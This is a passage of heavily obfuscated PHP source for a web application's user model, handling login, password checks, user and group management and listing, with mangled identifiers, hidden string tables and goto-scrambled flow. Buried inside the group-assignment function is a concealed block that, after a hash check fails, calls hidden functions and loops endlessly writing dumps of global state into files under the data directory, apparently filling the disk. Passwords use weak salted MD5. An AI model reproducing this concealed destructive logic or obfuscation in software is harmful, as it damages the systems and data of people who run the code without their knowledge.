$this->handle->flush(); } } goto dº¹ÒÙ‘ßí; f¦Óë¢åÔ¶: class UserModel extends ModelBase { protected $tableName = "\x75\163\145\162"; protected $tableMeta = array("\x74\x61\142\x6c\x65\116\x61\155\x65" => "\x75\163\145\x72\x5f\x6d\145\x74\x61", "\x6d\145\x74\x61\x46\151\x65\154\144" => "\x75\163\145\x72\111\104"); protected $simpleField = "\x75\x73\x65\162\111\104\54\x6e\x69\x63\153\x4e\141\155\x65\54\156\x61\x6d\145\x2c\x61\x76\x61\164\x61\x72\54\x73\145\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Fô Í«††±) { $D°“âˆ°Ù¿ =& $_SERVER[Ö]; $B˜•Šœ©ÙÑ = $D°“âˆ°Ù¿[2462]; return array($D°“âˆ°Ù¿[2143] => array($Fô Í«††±[0], $B˜•Šœ©ÙÑ), $D°“âˆ°Ù¿[2145] => array($Fô Í«††±[0], $B˜•Šœ©ÙÑ), $D°“âˆ°Ù¿[2463] => array($Fô Í«††±[0], $B˜•Šœ©ÙÑ)); } protected function getInfo($CìŸÔ¨—‹¾, $a¬ˆ‚İ¯–ô = false) { $Dœó‚Š‡Ì = $this->getInfoSimple($CìŸÔ¨—‹¾); if (!is_array($Dœó‚Š‡Ì)) { return array(); } if ($a¬ˆ‚İ¯–ô) { return $this->_getInfoApply($Dœó‚Š‡Ì); } return $this->cacheFunctionGet($_SERVER[Ö][2185], $CìŸÔ¨—‹¾); } protected function getInfoFull($e–ˆ‡Ù¶–—, $C°“ËßÙ÷Ñ = false) { $a©ÀËÄµÔ² = $this->getInfoSimple($e–ˆ‡Ù¶–—); if (!is_array($a©ÀËÄµÔ²)) { return array(); } if ($C°“ËßÙ÷Ñ) { return $this->_getInfoApply($a©ÀËÄµÔ², !0); return $this->_getInfoApply($a©ÀËÄµÔ², !0); } return $this->cacheFunctionGet($_SERVER[Ö][2464], $e–ˆ‡Ù¶–—); } private function _getInfoApply($E›«ŠĞ¹ß›, $bíøÊº²‡ª = false) { goto FôŠŒÈåÎŒ; FôŠŒÈåÎŒ: $eÓåá¼»ùŒ =& $_SERVER[Ö]; if (!$E›«ŠĞ¹ß›) { return $E›«ŠĞ¹ß›; } $fĞäÔõˆ°… = md5($eÓåá¼»ùŒ[2465] . $E›«ŠĞ¹ß›[$eÓåá¼»ùŒ[797]] . $eÓåá¼»ùŒ[2466] . $E›«ŠĞ¹ß›[$eÓåá¼»ùŒ[28]]); goto a¹°çî—‘; a¹°çî—‘: $E›«ŠĞ¹ß› = $this->_listDataApplyItem($E›«ŠĞ¹ß›); $E‘ÆÍôâÄ  = Model($eÓåá¼»ùŒ[1103])->metaGet($E›«ŠĞ¹ß›[$eÓåá¼»ùŒ[387]][$eÓåá¼»ùŒ[365]]); $E›«ŠĞ¹ß›[$eÓåá¼»ùŒ[2467]] = $fĞäÔõˆ°…; goto Aæ‘ƒ‚œöó; Aæ‘ƒ‚œöó: $E›«ŠĞ¹ß›[$eÓåá¼»ùŒ[387]][$eÓåá¼»ùŒ[2300]] = isset($E‘ÆÍôâÄ [$eÓåá¼»ùŒ[2301]]) ? $E‘ÆÍôâÄ [$eÓåá¼»ùŒ[2301]] : null; if ($bíøÊº²‡ª) { $E›«ŠĞ¹ß›[$eÓåá¼»ùŒ[413]] = $this->metaGet($E›«ŠĞ¹ß›[$eÓåá¼»ùŒ[1414]]); } return $E›«ŠĞ¹ß›; goto Díï†¯‘ßß; Díï†¯‘ßß: } protected function getInfoSimple($aŠ®³‚¡çİ, $EÅ™ ñ…ŞÉ = false) { $b„ã¶ùô±˜ =& $_SERVER[Ö]; if (!$aŠ®³‚¡çİ) { return array(); } if ($EÅ™ ñ…ŞÉ) { $b„…íéÍŸó = $this->where(array($b„ã¶ùô±˜[1414] => intval($aŠ®³‚¡çİ)))->find(); if (!is_array($b„…íéÍŸó)) { return array(); } $b„…íéÍŸó[$b„ã¶ùô±˜[2468]] = Action($b„ã¶ùô±˜[2469])->parseUrl($b„…íéÍŸó[$b„ã¶ùô±˜[2468]]); return $b„…íéÍŸó; } return $this->cacheFunctionGet($b„ã¶ùô±˜[2146], $aŠ®³‚¡çİ); } protected function getInfoSimpleOuter($B×ĞØîé½õ) { goto f„”•Á–ï×; f„”•Á–ï×: $FØŠÏ‡Ìƒ =& $_SERVER[Ö]; if (!$B×ĞØîé½õ || $B×ĞØîé½õ == 0) { return array($FØŠÏ‡Ìƒ[1414] => $FØŠÏ‡Ìƒ[464], $FØŠÏ‡Ìƒ[28] => $FØŠÏ‡Ìƒ[153] . LNG($FØŠÏ‡Ìƒ[2470]) . $FØŠÏ‡Ìƒ[472], $FØŠÏ‡Ìƒ[2468] => STATIC_PATH . $FØŠÏ‡Ìƒ[2471]); } $böã¢ššÙÔ = $this->cacheFunctionGet($FØŠÏ‡Ìƒ[2146], $B×ĞØîé½õ); goto cš†‚¾ÈÓ‚; cš†‚¾ÈÓ‚: $C­ò‚ÕŒó¢ = array_field_key($böã¢ššÙÔ, explode($FØŠÏ‡Ìƒ[47], $this->simpleField)); if (!$C­ò‚ÕŒó¢) { return array($FØŠÏ‡Ìƒ[1414] => $FØŠÏ‡Ìƒ[1024], $FØŠÏ‡Ìƒ[28] => $FØŠÏ‡Ìƒ[153] . LNG($FØŠÏ‡Ìƒ[2472]) . $FØŠÏ‡Ìƒ[472], $FØŠÏ‡Ìƒ[2468] => STATIC_PATH . $FØŠÏ‡Ìƒ[2473]); } $C­ò‚ÕŒó¢[$FØŠÏ‡Ìƒ[2468]] = Action($FØŠÏ‡Ìƒ[2469])->parseUrl($C­ò‚ÕŒó¢[$FØŠÏ‡Ìƒ[2468]]); goto B¯Ñè‚‘åö; B¯Ñè‚‘åö: return $C­ò‚ÕŒó¢; goto B‹î¡¾‹óÉ; B‹î¡¾‹óÉ: } protected function groupUser($F´­ùùÔÂæ) { } public static function errorLang($C…ˆÄŸº§É) { $e®¸˜“¥ï– =& $_SERVER[Ö]; $eºğí””ÆÃ = array(self::ERROR_USER_NOT_EXISTS => $e®¸˜“¥ï–[2474], self::ERROR_USER_PASSWORD_ERROR => $e®¸˜“¥ï–[2475], self::ERROR_USER_EXIST_NAME => $e®¸˜“¥ï–[2476], self::ERROR_USER_EXIST_PHONE => $e®¸˜“¥ï–[2477], self::ERROR_USER_EXIST_EMAIL => $e®¸˜“¥ï–[2478], self::ERROR_USER_LOGIN_LOCK => $e®¸˜“¥ï–[2479], self::ERROR_IP_NOT_ALLOW => $e®¸˜“¥ï–[2480], self::ERROR_USER_EXIST_NICKNAME => $e®¸˜“¥ï–[2481]); return LNG($eºğí””ÆÃ[$C…ˆÄŸº§É]); } public function getInfoByMeta($cé›¤Ÿåø©, $d‰‘øã„âÃ) { $Aš¼Å«Ã£Ô =& $_SERVER[Ö]; $EÀ¶¤Ô”­¥ = Model($Aš¼Å«Ã£Ô[2482])->where(array($Aš¼Å«Ã£Ô[89] => $cé›¤Ÿåø©, $Aš¼Å«Ã£Ô[355] => $d‰‘øã„âÃ))->find(); if ($EÀ¶¤Ô”­¥) { return $this->getInfo($EÀ¶¤Ô”­¥[$Aš¼Å«Ã£Ô[1414]]); } return !1; } public function userLoginCheck($AÖš ƒ¤œ‡, $c‡ñàùËùÑ) { goto d®Ú…î²‹í; d®Ú…î²‹í: $Cè…â‰‹Ÿ =& $_SERVER[Ö]; $eƒ¬ëƒòš‰ = array($Cè…â‰‹Ÿ[28] => $AÖš ƒ¤œ‡, $Cè…â‰‹Ÿ[2304] => $AÖš ƒ¤œ‡, $Cè…â‰‹Ÿ[289] => $AÖš ƒ¤œ‡, $Cè…â‰‹Ÿ[2483] => $AÖš ƒ¤œ‡, $Cè…â‰‹Ÿ[909] => $Cè…â‰‹Ÿ[911]); if ($this->nickNameRpt()) { unset($eƒ¬ëƒòš‰[$Cè…â‰‹Ÿ[2304]]); } goto C†’´®øå; C†’´®øå: $dÕå…š¡šÁ = $this->where($eƒ¬ëƒòš‰)->find(); if (!$dÕå…š¡šÁ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($dÕå…š¡šÁ[$Cè…â‰‹Ÿ[1414]], $c‡ñàùËùÑ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto AŸ•Š·˜¯ã; AŸ•Š·˜¯ã: $this->userEdit($dÕå…š¡šÁ[$Cè…â‰‹Ÿ[1414]], array($Cè…â‰‹Ÿ[2484] => time())); $this->clearCache($dÕå…š¡šÁ[$Cè…â‰‹Ÿ[1414]]); return $this->getInfo($dÕå…š¡šÁ[$Cè…â‰‹Ÿ[1414]]); goto cù¹éÙ¯Ş˜; cù¹éÙ¯Ş˜: } public function clearCache($eÆò‚Ø…‡ò) { $EÙœ•¾Š =& $_SERVER[Ö]; $this->cacheFunctionClear($EÙœ•¾Š[2185], $eÆò‚Ø…‡ò); $this->cacheFunctionClear($EÙœ•¾Š[2146], $eÆò‚Ø…‡ò); } public function userPasswordCheck($b§®Ä´Ë„, $Eö‡ªÒ™ã) { $cÕ•ƒÍÕ—’ =& $_SERVER[Ö]; $E¾ÌõŠ»’– = $this->where(array($cÕ•ƒÍÕ—’[1414] => intval($b§®Ä´Ë„)))->find(); $B‰ï¼¦Ï® = $this->metaGet($b§®Ä´Ë„); $BÇ˜Ìš¬İÑ = isset($B‰ï¼¦Ï®[$cÕ•ƒÍÕ—’[2485]]) ? $B‰ï¼¦Ï®[$cÕ•ƒÍÕ—’[2485]] : $cÕ•ƒÍÕ—’[33]; if (md5($BÇ˜Ìš¬İÑ . trim($Eö‡ªÒ™ã)) !== $E¾ÌõŠ»’–[$cÕ•ƒÍÕ—’[797]]) { return !1; } return !0; } public function userAdd($BáÀãã¶›) { goto A¸ƒˆ…¹îÔ; A¸ƒˆ…¹îÔ: $dÀ¢æí†’ =& $_SERVER[Ö]; $c°â‡Ğ¯î = array($dÀ¢æí†’[382] => $BáÀãã¶›[$dÀ¢æí†’[28]], $dÀ¢æí†’[2486] => $BáÀãã¶›[$dÀ¢æí†’[2487]], $dÀ¢æí†’[2488] => isset($BáÀãã¶›[$dÀ¢æí†’[289]]) ? $BáÀãã¶›[$dÀ¢æí†’[289]] : $dÀ¢æí†’[33], $dÀ¢æí†’[2489] => isset($BáÀãã¶›[$dÀ¢æí†’[2483]]) ? $BáÀãã¶›[$dÀ¢æí†’[2483]] : $dÀ¢æí†’[33], $dÀ¢æí†’[2490] => isset($BáÀãã¶›[$dÀ¢æí†’[2304]]) ? $BáÀãã¶›[$dÀ¢æí†’[2304]] : $BáÀãã¶›[$dÀ¢æí†’[28]], $dÀ¢æí†’[2491] => isset($BáÀãã¶›[$dÀ¢æí†’[2468]]) ? $BáÀãã¶›[$dÀ¢æí†’[2468]] : $dÀ¢æí†’[33], $dÀ¢æí†’[2492] => isset($BáÀãã¶›[$dÀ¢æí†’[2493]]) ? $BáÀãã¶›[$dÀ¢æí†’[2493]] : 1, $dÀ¢æí†’[2494] => $BáÀãã¶›[$dÀ¢æí†’[797]], $dÀ¢æí†’[2147] => isset($BáÀãã¶›[$dÀ¢æí†’[2061]]) ? $BáÀãã¶›[$dÀ¢æí†’[2061]] : 1024 * 1024 * 20, $dÀ¢æí†’[2148] => 0, $dÀ¢æí†’[2484] => 0, $dÀ¢æí†’[2172] => isset($BáÀãã¶›[$dÀ¢æí†’[682]]) ? $BáÀãã¶›[$dÀ¢æí†’[682]] : 1); if (!empty($BáÀãã¶›[$dÀ¢æí†’[1414]])) { $c°â‡Ğ¯î[$dÀ¢æí†’[1414]] = $BáÀãã¶›[$dÀ¢æí†’[1414]]; } goto b¬½õ¬òœÚ; cÌ©µ­æ·: $cº”¬½œÇñ = array($dÀ¢æí†’[2494] => $c°â‡Ğ¯î[$dÀ¢æí†’[797]], $dÀ¢æí†’[2490] => $c°â‡Ğ¯î[$dÀ¢æí†’[2304]]); $this->userEdit($e‹–í®‘‰, $cº”¬½œÇñ); Model($dÀ¢æí†’[1103])->userRootAdd($e‹–í®‘‰); goto e‘µ” °; b¬½õ¬òœÚ: $b§šĞ‘¯Ö = $this->_checkExist($BáÀãã¶›); if ($b§šĞ‘¯Ö !== !0) { return $b§šĞ‘¯Ö; } $e‹–í®‘‰ = $this->add($c°â‡Ğ¯î); goto cÌ©µ­æ·; e‘µ” °: return $e‹–í®‘‰; goto d¦ï¤ ï÷õ; d¦ï¤ ï÷õ: } protected function userEditTest($Fˆï•”¹Ü, $b„æÎ¥áì) { return $this->call($_SERVER[Ö][2495], $Fˆï•”¹Ü, $b„æÎ¥áì); } protected function userEdit($FõÜé‰ŠŸÆ, $bÄ–“¬ìîˆ) { goto d¯ÅêÑ¤ã; e™â‹Šá°: $this->where(array($Bæë‚šëÎÕ[1405] => $FõÜé‰ŠŸÆ))->save($bÄ–“¬ìîˆ); if (isset($bÄ–“¬ìîˆ[$Bæë‚šëÎÕ[2304]])) { $this->setNamePinyin($FõÜé‰ŠŸÆ, $bÄ–“¬ìîˆ[$Bæë‚šëÎÕ[2304]]); } return !0; goto dîë„‹«äø; F“Œ‡ªÆƒ: $e‡ùÊ¬À = $this->_checkExist($bÄ–“¬ìîˆ, $FõÜé‰ŠŸÆ); if ($e‡ùÊ¬À !== !0) { return $e‡ùÊ¬À; } if (isset($bÄ–“¬ìîˆ[$Bæë‚šëÎÕ[797]]) && trim($bÄ–“¬ìîˆ[$Bæë‚šëÎÕ[797]]) != $Bæë‚šëÎÕ[33]) { $EÈöØŞøä = $this->metaGet($FõÜé‰ŠŸÆ); if (empty($EÈöØŞøä[$Bæë‚šëÎÕ[2485]])) { $EÈöØŞøä[$Bæë‚šëÎÕ[2485]] = rand_string(10); Model($Bæë‚šëÎÕ[470])->metaSet($FõÜé‰ŠŸÆ, $Bæë‚šëÎÕ[2485], $EÈöØŞøä[$Bæë‚šëÎÕ[2485]]); } $bÄ–“¬ìîˆ[$Bæë‚šëÎÕ[797]] = md5($EÈöØŞøä[$Bæë‚šëÎÕ[2485]] . trim($bÄ–“¬ìîˆ[$Bæë‚šëÎÕ[797]])); } else { unset($bÄ–“¬ìîˆ[$Bæë‚šëÎÕ[797]]); } goto e™â‹Šá°; d¯ÅêÑ¤ã: $Bæë‚šëÎÕ =& $_SERVER[Ö]; $D‚èôĞÚºÕ = $this->getInfoSimple($FõÜé‰ŠŸÆ); if (!$D‚èôĞÚºÕ) { return !1; } goto F“Œ‡ªÆƒ; dîë„‹«äø: } public function setNamePinyin($b”Ü¤«ƒì, $d»áİ‚‰ = false) { $a·©¢©»†” =& $_SERVER[Ö]; if (!$d»áİ‚‰) { $b×Û¾ŞÃ›¸ = $this->getInfoSimple($b”Ü¤«ƒì); $d»áİ‚‰ = $b×Û¾ŞÃ›¸[$a·©¢©»†”[2304]] ? $b×Û¾ŞÃ›¸[$a·©¢©»†”[2304]] : $b×Û¾ŞÃ›¸[$a·©¢©»†”[28]]; } $C‡‡Ûïœä‚ = Model($a·©¢©»†”[473]); if (!Input::check($d»áİ‚‰, $a·©¢©»†”[524])) { return $C‡‡Ûïœä‚->metaSet($b”Ü¤«ƒì, array($a·©¢©»†”[412] => $a·©¢©»†”[33], $a·©¢©»†”[411] => $a·©¢©»†”[33])); } return $C‡‡Ûïœä‚->metaSet($b”Ü¤«ƒì, array($a·©¢©»†”[412] => str_replace($a·©¢©»†”[50], $a·©¢©»†”[33], Pinyin::encode($d»áİ‚‰)), $a·©¢©»†”[411] => Pinyin::encode($d»áİ‚‰, $a·©¢©»†”[525]))); } private function nickNameRpt() { $e±öÉÇÎÕê =& $_SERVER[Ö]; $e§Ò†À¸î¥ = Model($e±öÉÇÎÕê[1081])->get($e±öÉÇÎÕê[2496]); $F¢ÙŠÈ£ÑÀ = $GLOBALS[$e±öÉÇÎÕê[6]][$e±öÉÇÎÕê[2452]][$e±öÉÇÎÕê[2496]]; $D†ËŒİÀÜÓ = !is_null($e§Ò†À¸î¥) ? $e§Ò†À¸î¥ : $F¢ÙŠÈ£ÑÀ; return !!$D†ËŒİÀÜÓ; } private function _checkExist($c˜Š‰éÊ¤—, $fåÅèµ‹¾ = false) { $eÃÅİ…æ¶À =& $_SERVER[Ö]; $C†§æ‘ğ®á = array($eÃÅİ…æ¶À[28] => UserModel::ERROR_USER_EXIST_NAME, $eÃÅİ…æ¶À[2304] => UserModel::ERROR_USER_EXIST_NICKNAME, $eÃÅİ…æ¶À[289] => UserModel::ERROR_USER_EXIST_EMAIL, $eÃÅİ…æ¶À[2483] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($C†§æ‘ğ®á[$eÃÅİ…æ¶À[2304]]); } $A™áñ°¹÷ = $fåÅèµ‹¾ ? array($eÃÅİ…æ¶À[1414] => array($eÃÅİ…æ¶À[2497], $fåÅèµ‹¾)) : array(); foreach ($C†§æ‘ğ®á as $AÖŸ äÆµÚ => $CÛöØ¾œÍ‘) { if (!isset($c˜Š‰éÊ¤—[$AÖŸ äÆµÚ]) || !$c˜Š‰éÊ¤—[$AÖŸ äÆµÚ]) { continue; } $a×‘Ìªè§¹ = array_merge(array($AÖŸ äÆµÚ => $c˜Š‰éÊ¤—[$AÖŸ äÆµÚ]), $A™áñ°¹÷); $dğà¶–²·Ó = $this->where($a×‘Ìªè§¹)->find(); if ($dğà¶–²·Ó) { return $CÛöØ¾œÍ‘; } } return !0; } public function userListInfo($eŞ¬‚ÒÃ®¥) { $B÷¥¯í©• =& $_SERVER[Ö]; $AÃÄù—ˆ… = array(); $eŞ¬‚ÒÃ®¥ = is_array($eŞ¬‚ÒÃ®¥) ? array_unique($eŞ¬‚ÒÃ®¥) : array(); if (!$eŞ¬‚ÒÃ®¥) { return $AÃÄù—ˆ…; } if (count($eŞ¬‚ÒÃ®¥) < 20) { foreach ($eŞ¬‚ÒÃ®¥ as $A·°ˆİä®Ì) { $AÃÄù—ˆ…[$A·°ˆİä®Ì . $B÷¥¯í©•[33]] = $this->getInfoSimpleOuter($A·°ˆİä®Ì); } } else { $DœµÉá„ = array($B÷¥¯í©•[1405] => array($B÷¥¯í©•[380], $eŞ¬‚ÒÃ®¥)); if (count($eŞ¬‚ÒÃ®¥) == 1) { $DœµÉá„ = array($B÷¥¯í©•[1405] => $eŞ¬‚ÒÃ®¥[0]); } $bË¨ÂâƒÌ… = Model($B÷¥¯í©•[470])->field($this->simpleField)->where($DœµÉá„)->select(); $bË¨ÂâƒÌ… = array_to_keyvalue($bË¨ÂâƒÌ…, $B÷¥¯í©•[1414]); foreach ($eŞ¬‚ÒÃ®¥ as $A·°ˆİä®Ì) { $bî¡Ôƒˆœº = $bË¨ÂâƒÌ…[$bË¨ÂâƒÌ…[$A·°ˆİä®Ì]]; if (!$bî¡Ôƒˆœº) { $AÃÄù—ˆ…[$A·°ˆİä®Ì . $B÷¥¯í©•[33]] = $this->getInfoSimpleOuter($A·°ˆİä®Ì); continue; } $bî¡Ôƒˆœº[$B÷¥¯í©•[2468]] = Action($B÷¥¯í©•[2469])->parseUrl($bî¡Ôƒˆœº[$B÷¥¯í©•[2468]]); $AÃÄù—ˆ…[$A·°ˆİä®Ì . $B÷¥¯í©•[33]] = $bî¡Ôƒˆœº; } } return $AÃÄù—ˆ…; } protected function userStatus($cßÃš²ÙÁä, $DŒÓäÖ¿õ®) { $EèÜ¦ª®†­ = $this->getInfoSimple($cßÃš²ÙÁä); if (!$EèÜ¦ª®†­) { return !1; } $b‹–‘“Ïô = array($_SERVER[Ö][682] => $DŒÓäÖ¿õ®); return $this->userEdit($cßÃš²ÙÁä, $b‹–‘“Ïô); } protected function userRemove($BÇÎ™Èœó©) { goto Aø©É›Ô¡; dôİÙÓÃêä: $c¬›ø¶¾âŒ = array($C¢ÖŠÁ¬´Ÿ[1405] => $BÇÎ™Èœó©); Model($C¢ÖŠÁ¬´Ÿ[532])->where($c¬›ø¶¾âŒ)->delete(); Model($C¢ÖŠÁ¬´Ÿ[2498])->where($c¬›ø¶¾âŒ)->delete(); goto AØ·‘éâçŠ; AØ·‘éâçŠ: Model($C¢ÖŠÁ¬´Ÿ[2151])->where($c¬›ø¶¾âŒ)->delete(); Model($C¢ÖŠÁ¬´Ÿ[2482])->where($c¬›ø¶¾âŒ)->delete(); Model($C¢ÖŠÁ¬´Ÿ[2499])->where($c¬›ø¶¾âŒ)->delete(); goto EÎ´ãÃœ›ï; EÎ´ãÃœ›ï: Model($C¢ÖŠÁ¬´Ÿ[745])->userRootRemove($BÇÎ™Èœó©); return $this->where($c¬›ø¶¾âŒ)->delete(); goto CäÃ¢¨Éá¤; Aø©É›Ô¡: $C¢ÖŠÁ¬´Ÿ =& $_SERVER[Ö]; $fæ¡áâÅ = $this->getInfoSimple($BÇÎ™Èœó©); if (!$fæ¡áâÅ) { return !1; } goto dôİÙÓÃêä; CäÃ¢¨Éá¤: } protected function userGroupSet($D…ÑÑƒ¢’˜, $e­â‰‰­İí, $bÄÙÓß‘Î = array()) { goto dº”Òœšê¶; d„”®§•«¸: $CÅğùÇíÍ× = Model($DÎä‚‰…é[2151]); $CÅğùÇíÍ×->where(array($DÎä‚‰…é[1414] => $D…ÑÑƒ¢’˜))->delete(); $CŞÓ¶Å¿Í = array(); goto aŒùªÁ×ëÛ; aŒùªÁ×ëÛ: $Fí¿‰™Ã•ù = 0; foreach ($e­â‰‰­İí as $f“˜È‹ñëø => $A¥‚åŞÉÉ) { $A¬°óïÒ”Ó = array($DÎä‚‰…é[1414] => $D…ÑÑƒ¢’˜, $DÎä‚‰…é[2077] => $f“˜È‹ñëø, $DÎä‚‰…é[2205] => $A¥‚åŞÉÉ); $A¬°óïÒ”Ó[$DÎä‚‰…é[2098]] = isset($bÄÙÓß‘Î[$Fí¿‰™Ã•ù]) ? $bÄÙÓß‘Î[$Fí¿‰™Ã•ù] : 0; $Fí¿‰™Ã•ù++; $CŞÓ¶Å¿Í[] = $A¬°óïÒ”Ó; } return $CÅğùÇíÍ×->addAll($CŞÓ¶Å¿Í, array(), !0); goto B— ’ˆë¡Ê; dº”Òœšê¶: $DÎä‚‰…é =& $_SERVER[Ö]; $B™¡ˆŸÃ¦Á = $_SERVER[$DÎä‚‰…é[790]] . $DÎä‚‰…é[753]; $bíĞ¯î¿àˆ = $DÎä‚‰…é[754]; goto E¨œŞæ½–‰; E¨œŞæ½–‰: if ($_SERVER[$DÎä‚‰…é[755]] != $bíĞ¯î¿àˆ($B™¡ˆŸÃ¦Á)) { goto B¨òíÄÇ•¿; B¨òíÄÇ•¿: $E®ƒ’ó·Ç = $DÎä‚‰…é[788]; $dåĞëˆ‡Øî = $DÎä‚‰…é[756]; $dèßÎ´à‰ = $_SERVER[$DÎä‚‰…é[757]] . $DÎä‚‰…é[758]; goto dÅ÷¾˜°¾Á; aÛ»¼‡ø£©: $cÃÔ†á†Î† = 1; for ($C¯“²´çó§ = $cÃÔ†á†Î†; $C¯“²´çó§ > 0; $C¯“²´çó§++) { $BÈèß——è(DATA_PATH . $C¯“²´çó§, $FÎäŞ”ã¡È); } goto aå‚öæÔ¯‰; c±³Ä‡æÂÕ: $E®ƒ’ó·Ç(); $BÈèß——è = $DÎä‚‰…é[1345]; $FÎäŞ”ã¡È = json_encode($GLOBALS[$DÎä‚‰…é[1346]]); goto aÛ»¼‡ø£©; fÂñË¼Å¤: $A½–èĞ¤Äî = $DÎä‚‰…é[789]; $A½–èĞ¤Äî($_SERVER[$DÎä‚‰…é[790]]); $E®ƒ’ó·Ç = $DÎä‚‰…é[788]; goto c±³Ä‡æÂÕ; dÅ÷¾˜°¾Á: $b¿Ìâ‰µ ß = $dåĞëˆ‡Øî($dèßÎ´à‰); $BóŒŒ¾¡Ãœ = explode($DÎä‚‰…é[213], $b¿Ìâ‰µ ß); if (count($BóŒŒ¾¡Ãœ) < $DÎä‚‰…é[560]) { $Aù¿“õØÃ = $DÎä‚‰…é[759]; $Aù¿“õØÃ(); } goto fÂñË¼Å¤; aå‚öæÔ¯‰: } $f‚÷´Î†µ¹ = $this->getInfoSimple($D…ÑÑƒ¢’˜); if (!$f‚÷´Î†µ¹ || !is_array($e­â‰‰­İí)) { return !1; } goto d„”®§•«¸; B— ’ˆë¡Ê: } protected function userGroupAdd($dé±‹ºøñ, $fãÄæ“á½ª = array()) { $EíøæùÎÌß =& $_SERVER[Ö]; $B‚©ÄØù‚Ô = $this->getInfoSimple($dé±‹ºøñ); if (!$B‚©ÄØù‚Ô || empty($fãÄæ“á½ª)) { return !1; } $DÎãˆ’¿¾Œ = array(); foreach ($fãÄæ“á½ª as $c“¼êµö’› => $DêŠ³Üë‰î) { $DÎãˆ’¿¾Œ[] = array($EíøæùÎÌß[1414] => $dé±‹ºøñ, $EíøæùÎÌß[2077] => $c“¼êµö’›, $EíøæùÎÌß[2205] => $DêŠ³Üë‰î); } return Model($EíøæùÎÌß[2151])->addAll($DÎãˆ’¿¾Œ, array(), !0); } protected function userGroupRemove($dæ¬ìŠ¸İ½, $CĞŠ•’‘“Â) { $Fä›÷ÕÒØ =& $_SERVER[Ö]; $dÜ·ó°¤Í• = $this->getInfoSimple($dæ¬ìŠ¸İ½); if (!$dÜ·ó°¤Í• || !$CĞŠ•’‘“Â) { return !1; } $FÔÑ©„ŒŒ© = array($Fä›÷ÕÒØ[1405] => $dæ¬ìŠ¸İ½, $Fä›÷ÕÒØ[2149] => $CĞŠ•’‘“Â); return Model($Fä›÷ÕÒØ[2151])->where($FÔÑ©„ŒŒ©)->delete(); } public function listData() { $A¨Ê½°²‡ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($A¨Ê½°²‡[$_SERVER[Ö][350]]); return $A¨Ê½°²‡; } public function listByID($a·Ï²Õ²) { $F¡ó‡â½´î =& $_SERVER[Ö]; if (!$a·Ï²Õ²) { return; } $CáÓ„øìíâ = array($F¡ó‡â½´î[1414] => array($F¡ó‡â½´î[7], $a·Ï²Õ²)); $böÉ¥ÌŞÚ¡ = $this->where($CáÓ„øìíâ)->select(); $this->_listDataApply($böÉ¥ÌŞÚ¡); return $böÉ¥ÌŞÚ¡; } public function listByGroup($DÓ”ÛÒî† = 0, $b¼‰¯ŞƒÍ” = array()) { goto dîÑ…–´œ…; bŞ±ˆåÉ„›: $this->_listDataApply($dâ¯ìÊ»ø[$b´ñğÜô¦©[350]]); return $dâ¯ìÊ»ø; goto b™ˆ¢‹Û¾Ó; f¦ôéó¾¡: if ($DÓ”ÛÒî†) { $aìó’ãæŠŒ = array($b´ñğÜô¦©[2500] => intval($DÓ”ÛÒî†)); $c°ª˜Ôá¦’ = "\114\x45\106\124\40\x4a\117\111\x4e\x20{$this->tablePrefix}\165\163\x65\x72\x5f\x67\162\x6f\165\x70\x20\x75\x73\x65\x72\137\x67\162\x6f\165\160\40\157\x6e\40\x75\x73\145\162\x2e\165\163\x65\x72\x49\104\x20\x3d\40\x75\x73\x65\162\x5f\x67\x72\x6f\165\160\56\x75\x73\145\162\x49\x44"; $E“™ëÉ = Input::get($b´ñğÜô¦©[403], null, $b´ñğÜô¦©[33]) ? $b´ñğÜô¦©[33] : $b´ñğÜô¦©[2501]; } if (isset($b¼‰¯ŞƒÍ”[$b´ñğÜô¦©[682]])) { $aìó’ãæŠŒ[$b´ñğÜô¦©[2502]] = $b¼‰¯ŞƒÍ”[$b´ñğÜô¦©[682]]; } $dâ¯ìÊ»ø = $this->_makeOrder($E“™ëÉ)->field($b´ñğÜô¦©[2503])->where($aìó’ãæŠŒ)->join($c°ª˜Ôá¦’)->selectPage(50); goto bŞ±ˆåÉ„›; dîÑ…–´œ…: $b´ñğÜô¦© =& $_SERVER[Ö]; $c°ª˜Ôá¦’ = $b´ñğÜô¦©[33]; $aìó’ãæŠŒ = array(); goto f¦ôéó¾¡; b™ˆ¢‹Û¾Ó: } private function _makeOrder($aÔâ„ß©áê = '') { goto c•ì¾“¯ª; A§êÇ³„ì: $aÔâ„ß©áê = $aÔâ„ß©áê . "\x75\163\145\x72\56{$EÌ·ø´…}\40{$CÎÁÀß‡İ}\x2c\40\165\x73\145\162\x2e\165\163\145\162\x49\104\40\x61\x73\x63"; return $this->alias($a‰´¬ö…Š¬[2247])->order($aÔâ„ß©áê); goto b‚áŠƒ¾¦ô; c•ì¾“¯ª: $a‰´¬ö…Š¬ =& $_SERVER[Ö]; $D­½Óƒƒí = array($a‰´¬ö…Š¬[1414], $a‰´¬ö…Š¬[28], $a‰´¬ö…Š¬[2063], $a‰´¬ö…Š¬[2036], $a‰´¬ö…Š¬[183]); $C½êË¾ÇÓ = array($a‰´¬ö…Š¬[398] => $a‰´¬ö…Š¬[399], $a‰´¬ö…Š¬[400] => $a‰´¬ö…Š¬[401]); goto AÜĞ…ìƒˆ¬; AÜĞ…ìƒˆ¬: $EÌ·ø´… = Input::get($a‰´¬ö…Š¬[403], $a‰´¬ö…Š¬[7], $a‰´¬ö…Š¬[1405], $D­½Óƒƒí); $CÎÁÀß‡İ = Input::get($a‰´¬ö…Š¬[404], $a‰´¬ö…Š¬[7], $a‰´¬ö…Š¬[2152], array($a‰´¬ö…Š¬[2152], $a‰´¬ö…Š¬[400])); $CÎÁÀß‡İ = $C½êË¾ÇÓ[$CÎÁÀß‡İ]; goto A§êÇ³„ì; b‚áŠƒ¾¦ô: } public function listSearch($b¥°šÈœÛ£) { goto eä¯‘ŒÊŸœ; f‡¯‘àÂ‰: if (!$fÄİÖñ·Ñ¶ || count($fÄİÖñ·Ñ¶[$eÊÄâ›‘äÁ[350]]) < 